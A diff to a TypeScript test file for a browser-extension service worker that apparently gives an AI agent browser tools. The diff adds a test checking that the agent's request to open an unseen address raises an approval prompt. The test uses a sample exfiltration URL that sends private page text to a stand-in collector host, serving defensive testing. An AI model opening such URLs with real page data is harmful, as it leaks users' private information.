@@ -258,6 +258,92 @@ describe("service-worker browser orchestration", () => {
     });
   });
 
+  it("asks before opening an address the thread has not seen", async () => {
+    const sessionData: Record<string, unknown> = {};
+    const localData: Record<string, unknown> = {};
+    const openTab = { id: 5, windowId: 1, index: 0, active: true, pinned: false, highlighted: true, incognito: false, selected: true, discarded: false, autoDiscardable: true, frozen: false, lastAccessed: Date.now(), groupId: -1, title: "Inbox", url: "https://example.com/inbox", status: "complete" } satisfies chrome.tabs.Tab;
+    const create = vi.fn(async (properties: chrome.tabs.CreateProperties) => ({ ...openTab, id: 80, active: false, url: properties.url }));
+    const nativeRequests: NativeRequest[] = [];
+    let nativeMessageListener: ((message: unknown) => void) | undefined;
+    const port = {
+      onMessage: { addListener: (listener: (message: unknown) => void) => { nativeMessageListener = listener; } },
+      onDisconnect: { addListener: vi.fn() },
+      postMessage: (message: NativeRequest) => {
+        nativeRequests.push(message);
+        queueMicrotask(() => nativeMessageListener?.({ type: "response", id: message.id, ok: true, data: {} }));
+      },
+    };
+    vi.stubGlobal("chrome", {
+      runtime: {
+        id: "extension-id",
+        connectNative: () => port,
+        sendMessage: vi.fn(async () => undefined),
+        onMessage: { addListener: vi.fn() },
+        onInstalled: { addListener: vi.fn() },
+        onStartup: { addListener: vi.fn() },
+      },
+      storage: { session: storageArea(sessionData), local: storageArea(localData) },
+      tabs: {
+        query: vi.fn(async () => [openTab]),
+        get: vi.fn(async (tabId: number) => ({ ...openTab, id: tabId })),
+        create,
+        sendMessage: vi.fn(async () => ({ ok: true, data: { active: false } })),
+        onRemoved: { addListener: vi.fn() },
+      },
+      permissions: { contains: vi.fn(async () => false) },
+      sidePanel: { setPanelBehavior: vi.fn(async () => undefined) },
+    });
+    const { serviceWorkerTestHooks } = await import("../src/background/service-worker");
+    const open = (requestId: number, callId: string, url: string) => serviceWorkerTestHooks.handleDynamicToolCall({
+      requestId,
+      threadId: "thread-open",
+      turnId: "turn-open",
+      callId,
+      namespace: "tabs",
+      tool: "open",
+      arguments: { url },
+    });
+
+    await open(1, "open-known", "https://example.com/inbox");
+    expect(create).toHaveBeenCalledWith({ url: "https://example.com/inbox", active: false });
+
+    const exfiltration = "https://collector.example/?d=private-page-text";
+    await open(2, "open-unknown", exfiltration);
+    expect(create).not.toHaveBeenCalledWith(expect.objectContaining({ url: exfiltration }));
+    await expect(serviceWorkerTestHooks.routeRequest({
+      type: "BROWSER_STATE_READ",
+      requestId: crypto.randomUUID(),
+    })).resolves.toMatchObject({
+      prompts: [expect.objectContaining({
+        type: "approval",
+        data: expect.objectContaining({ callId: "open-unknown", title: "Open this page?", target: { label: "collector.example", url: exfiltration } }),
+      })],
+    });
+
+    await serviceWorkerTestHooks.routeRequest({ type: "TOOL_DECISION", requestId: crypto.randomUUID(), callId: "open-unknown", approved: true });
+    expect(create).toHaveBeenCalledWith({ url: exfiltration, active: false });
+    expect(nativeRequests).toContainEqual(expect.objectContaining({
+      method: "tool.respond",
+      params: expect.objectContaining({ requestId: 2, success: true }),
+    }));
+
+    create.mockClear();
+    await open(3, "open-approved-again", exfiltration);
+    expect(create).toHaveBeenCalledWith({ url: exfiltration, active: false });
+
+    localData.codexSidebarBrowserPermissionMode = "ask";
+    await serviceWorkerTestHooks.handleDynamicToolCall({
+      requestId: 4,
+      threadId: "thread-other",
+      turnId: "turn-other",
+      callId: "open-other-thread",
+      namespace: "tabs",
+      tool: "open",
+      arguments: { url: exfiltration },
+    });
+    expect(create).toHaveBeenCalledTimes(1);
+  });
+
   it("executes consequential page actions in full mode, captures the mode per task, and prompts in ask mode", async () => {
     const sessionData: Record<string, unknown> = {
       codexSidebarThreadWorkingTabs: [
@@ -669,7 +755,7 @@ describe("service-worker browser orchestration", () => {
       requestId: requestId(),
       threadId: "thread-3",
       clientMessageId: requestId(),
-      text: "Check my calendar again",
+      text: "Check my calendar again at https://calendar.google.com/calendar/day.",
     })).resolves.toEqual({ turnId: "turn-3" });
     expect(indicatorStates).toHaveLength(indicatorCount);
     await serviceWorkerTestHooks.handleDynamicToolCall({
